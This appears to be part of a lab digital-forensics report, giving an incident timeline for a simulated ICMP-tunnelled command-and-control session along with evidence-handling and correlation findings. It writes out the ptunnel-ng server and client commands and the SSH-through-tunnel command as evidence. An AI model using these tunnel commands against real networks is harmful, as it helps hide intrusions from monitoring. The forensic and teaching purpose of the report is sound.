# Stage 6 — Incident Timeline

| Date/Time (UTC) | Source | Event | Evidence | Interpretation |
|---|---|---|---|---|
| 2026-11-19 21:37:53 | attacker-c2 (journalctl) | ptunnel-ng server started (`-r0.0.0.0 -R22`) | Stage 3 log entry | C2 channel made available on the attacker-controlled endpoint |
| 2026-11-19 21:39:42 | victim (journalctl) | ptunnel-ng client started (`-p 192.168.100.20 -l 2222 -r192.168.100.20 -R22`) | Stage 3 log entry | Victim connects to the C2 endpoint ~2 minutes after server start; consistent with coordinated setup |
| 2026-11-19/20 (same session) | victim (Wireshark) | Packet capture started on enp0s3; SSH session established through the tunnel (`ssh -p 2222 attacker-c2@127.0.0.1`); commands executed (whoami, pwd, uname -a, ls -la) | Stage 1 collection log; Stage 2 packet analysis | Actual C2 activity generated and captured - SSH traffic tunneled inside ICMP Echo packets |
| 2026-11-20 | victim | Capture stopped; saved as LAB1_Network_Evidence.pcapng; SHA-256 hash calculated (a3c7a8fed...) | Stage 1 evidence record | Evidence preserved with integrity verification immediately after collection |
| 2026-11-22 | victim -> GitHub | Evidence file transferred to repository (stage1/evidence/) via GitHub PAT; hash re-verified before transfer | Stage 1 chain of custody | Evidence integrity confirmed unchanged through transfer |

## Description of the Sequence of Events

The timeline shows a short, tightly-coupled sequence: the C2 server was
brought online first (attacker-c2), followed within approximately two
minutes by the client connection from the victim host. Once connected,
the tunnel was used to carry a complete SSH session, which was captured
in real time by Wireshark on the victim host. The evidence was preserved
and hashed immediately after capture, and later transferred to the
project repository with its integrity re-verified at the point of
transfer.

## Results of Temporal Data Correlation

Converting all timestamps to a common UTC reference confirms that the
server-side and client-side log timestamps (Stage 3) are consistent with
each other and with the known collection order described in Stage 1 -
there is no contradiction or gap that would suggest tampering or
out-of-order activity.

## Findings Based on Event Reconstruction

The reconstructed timeline supports the conclusion reached in Stage 5:
the observed activity is a coordinated, short-duration C2 session rather
than incidental or long-running background traffic, with clear
cause-and-effect ordering between server startup, client connection, and
the captured SSH activity.